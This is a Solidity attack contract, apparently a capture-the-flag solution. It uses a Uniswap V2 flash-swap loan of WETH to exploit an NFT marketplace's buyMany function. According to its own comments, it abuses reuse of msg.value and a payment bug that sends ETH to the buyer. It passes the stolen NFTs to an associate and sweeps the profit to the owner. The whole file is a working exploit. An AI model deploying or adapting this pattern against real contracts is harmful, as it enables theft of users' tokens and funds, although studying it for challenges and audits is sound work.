pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

interface IWETH9 {
	function deposit() external payable;
	function withdraw(uint wad) external;
	function balanceOf(address) external returns (uint256);
	function transfer(address dst, uint wad) external returns (bool);
}

interface NFTMarketplace {
	function buyMany(uint256[] calldata tokenIds) external payable;
}

/**
 * The GhostRider contract implements the Uniswap callback method for exploiting the NFT marketplace using the borrowed WETH
 */
contract GhostRider is IERC721Receiver {
	address payable owner;
	address buyer;
	IERC721 nftToken;
	address marketplace;

	constructor(address payable _owner, address _buyer, address _nft, address _marketplace) {
		owner = _owner;
		buyer = _buyer;
		nftToken = IERC721(_nft);
		marketplace = _marketplace;
	}

	// Uniswap callback function
	function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external {
		address weth_token = IUniswapV2Pair(msg.sender).token0();
		IWETH9 weth_contract = IWETH9(payable(weth_token));
		uint256 weth_borrowed = amount0;
	
		// Withdraw borrowed WETH for ETH
		require(weth_contract.balanceOf(address(this)) == weth_borrowed);
		console.log("[WETH]\tBalance:", weth_contract.balanceOf(address(this)));
		weth_contract.withdraw(weth_borrowed);

		// Buy NFTs exploiting the reuse of 'msg.value' and the sent ETH to buyer instead of seller, then send them to our associate buyer
		uint256[] memory ids = abi.decode(data, (uint256[]));
		NFTMarketplace(marketplace).buyMany{value: weth_borrowed}(ids);
		transferNFTs(ids);

		// Pay 1% back on the borrowed amount for Uniswap, probably higher than required (~ 0.3009027% from the docs) but hey, they have been useful :)
		uint256 repay_amount = weth_borrowed * 101 / 100;
		weth_contract.deposit{value: weth_borrowed * 101 / 100}();
		weth_contract.transfer(msg.sender, weth_borrowed * 101 / 100);
		console.log("[ETH]\tPaid back", repay_amount, "WETH (Wei) to Uniswap");
	}

	function transferNFTs(uint256[] memory _tokenIds) private {
		for (uint i = 0; i < _tokenIds.length; ++i){
			nftToken.safeTransferFrom(address(this), buyer, _tokenIds[i]);
			console.log("[NFT]\tTransfered #", _tokenIds[i], "to", buyer);
		}
	}

	function sweep() external {
		require(msg.sender == owner);
		console.log("[ETH]\tSending", address(this).balance, "ETH to", owner);
		owner.transfer(address(this).balance);
	}

	function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata) external override returns (bytes4) {
		require(_operator == marketplace);
		console.log("[NFT]\tReceived #", _tokenId, "from", _from);

		return this.onERC721Received.selector;
	}

	receive() external payable { console.log("[ETH]\tReceived", msg.value, "from", msg.sender); }
}
